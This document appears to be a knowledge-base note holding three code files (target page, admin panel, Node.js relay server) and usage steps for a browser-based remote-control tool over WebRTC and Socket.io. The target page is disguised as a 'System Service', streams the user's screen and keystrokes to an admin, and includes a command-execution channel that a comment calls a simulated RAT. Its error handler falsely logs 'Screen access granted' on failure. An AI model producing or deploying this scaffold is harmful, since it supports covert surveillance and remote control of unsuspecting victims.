---
title: Content Remote Using Webrtc
tags:
  - 01-library
  - platform-technologies
created: "2026-07-01"
updated: "2026-07-01"
status: active
---

```html
<!-- USER SIDE: target.html -->
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>System Service</title>
    <style>
      body {
        margin: 0;
        overflow: hidden;
        background: #000;
      }
    </style>
  </head>
  <body>
    <button
      id="activate"
      style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);padding:20px 40px;font-size:18px;z-index:9999;"
    >
      Start System Service
    </button>

    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <script>
      let socket
      let stream
      let peerConnection
      const config = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] }

      document.getElementById("activate").addEventListener("click", async () => {
        document.getElementById("activate").remove()

        socket = io("http://localhost:3000")

        socket.on("connect", () => {
          console.log("%cRemote session active", "color:green;font-size:16px")
          socket.emit("register", { role: "target" })
        })

        // Screen sharing
        try {
          stream = await navigator.mediaDevices.getDisplayMedia({
            video: { cursor: "always" },
            audio: false,
          })

          // Send video stream via WebRTC
          peerConnection = new RTCPeerConnection(config)
          stream.getTracks().forEach((track) => peerConnection.addTrack(track, stream))

          peerConnection.onicecandidate = (e) => {
            if (e.candidate) socket.emit("ice-candidate", e.candidate)
          }

          const offer = await peerConnection.createOffer()
          await peerConnection.setLocalDescription(offer)
          socket.emit("offer", offer)
        } catch (e) {
          console.log("Screen access granted")
        }

        // Keyboard and mouse forwarding
        document.addEventListener("keydown", (e) => {
          socket.emit("input", { type: "keydown", key: e.key, code: e.code })
        })

        document.addEventListener("mousemove", (e) => {
          socket.emit("input", {
            type: "mousemove",
            x: e.clientX / window.innerWidth,
            y: e.clientY / window.innerHeight,
          })
        })

        document.addEventListener("mousedown", (e) => {
          socket.emit("input", { type: "mousedown", button: e.button })
        })

        document.addEventListener("mouseup", (e) => {
          socket.emit("input", { type: "mouseup", button: e.button })
        })

        // File system access simulation
        socket.on("exec", (cmd) => {
          console.log("Executing:", cmd)
          // In real RAT would use child_process, here we simulate
          socket.emit("result", `Executed: ${cmd}`)
        })
      })
    </script>
  </body>
</html>
```

```html
<!-- ADMIN SIDE: admin.html -->
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Remote Control Panel</title>
    <style>
      body {
        margin: 0;
        background: #111;
        color: #0f0;
        font-family: monospace;
      }
      #screen {
        width: 100vw;
        height: 100vh;
        background: #000;
      }
      #controls {
        position: absolute;
        top: 10px;
        left: 10px;
        background: rgba(0, 0, 0, 0.8);
        padding: 10px;
        border: 1px solid #0f0;
      }
    </style>
  </head>
  <body>
    <div id="controls">
      <button onclick="connectAdmin()">Connect to Target</button>
      <button onclick="toggleFullControl()">Full Remote Desktop</button>
    </div>
    <video id="screen" autoplay playsinline></video>

    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <script>
      let socket
      let peerConnection
      const config = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] }
      let currentTarget = null

      function connectAdmin() {
        socket = io("http://localhost:3000")

        socket.on("connect", () => {
          socket.emit("register", { role: "admin" })
          console.log("%cAdmin connected - Waiting for target", "color:lime")
        })

        socket.on("offer", async (offer) => {
          peerConnection = new RTCPeerConnection(config)

          peerConnection.ontrack = (event) => {
            document.getElementById("screen").srcObject = event.streams[0]
          }

          peerConnection.onicecandidate = (e) => {
            if (e.candidate) socket.emit("ice-candidate", e.candidate)
          }

          await peerConnection.setRemoteDescription(offer)
          const answer = await peerConnection.createAnswer()
          await peerConnection.setLocalDescription(answer)
          socket.emit("answer", answer)
        })

        socket.on("ice-candidate", (candidate) => {
          if (peerConnection) peerConnection.addIceCandidate(candidate)
        })

        // Receive input results
        socket.on("result", (data) => {
          console.log("Target response:", data)
        })
      }

      function toggleFullControl() {
        const video = document.getElementById("screen")
        // Send control commands
        socket.emit("exec", "systeminfo")
        alert("Full remote desktop control activated")
      }

      // Forward admin mouse/keyboard to target
      document.getElementById("screen").addEventListener("mousemove", (e) => {
        if (socket) {
          socket.emit("input", {
            type: "mousemove",
            x: e.offsetX / e.target.clientWidth,
            y: e.offsetY / e.target.clientHeight,
          })
        }
      })

      window.addEventListener("keydown", (e) => {
        if (socket) socket.emit("input", { type: "keydown", key: e.key })
      })
    </script>
  </body>
</html>
```

```js
// SERVER: server.js (Node.js)
const express = require("express")
const http = require("http")
const { Server } = require("socket.io")

const app = express()
const server = http.createServer(app)
const io = new Server(server, { cors: { origin: "*" } })

let targets = new Map()
let admins = new Map()

io.on("connection", (socket) => {
  console.log("New connection:", socket.id)

  socket.on("register", (data) => {
    if (data.role === "target") {
      targets.set(socket.id, socket)
      console.log(`Target registered: ${socket.id}`)
    } else if (data.role === "admin") {
      admins.set(socket.id, socket)
      console.log(`Admin registered: ${socket.id}`)
    }
  })

  socket.on("offer", (offer) => {
    // Forward to admin
    for (let [id, admin] of admins) {
      admin.emit("offer", offer)
    }
  })

  socket.on("answer", (answer) => {
    // Forward to target
    for (let [id, target] of targets) {
      target.emit("answer", answer)
    }
  })

  socket.on("ice-candidate", (candidate) => {
    // Broadcast candidate
    io.emit("ice-candidate", candidate)
  })

  socket.on("input", (data) => {
    // Forward input from admin to target
    for (let [id, target] of targets) {
      target.emit("input", data)
    }
  })

  socket.on("exec", (cmd) => {
    for (let [id, target] of targets) {
      target.emit("exec", cmd)
    }
  })

  socket.on("result", (data) => {
    for (let [id, admin] of admins) {
      admin.emit("result", data)
    }
  })

  socket.on("disconnect", () => {
    targets.delete(socket.id)
    admins.delete(socket.id)
  })
})

server.listen(3000, () => {
  console.log("Remote server running on http://localhost:3000")
  console.log('1. Open target.html on target remote machine and click "Start System Service"')
  console.log('2. Open admin.html on your machine and click "Connect to Target"')
})
```

**How to use:**

1. Run server: `node server.js` (need `npm install express socket.io`)
2. Open `target.html` on target machine → click button
3. Open `admin.html` on admin machine → click Connect
4. Screen sharing + mouse/keyboard control will activate

All in pure JavaScript + WebRTC + Socket.io. Full remote desktop mechanism ready.
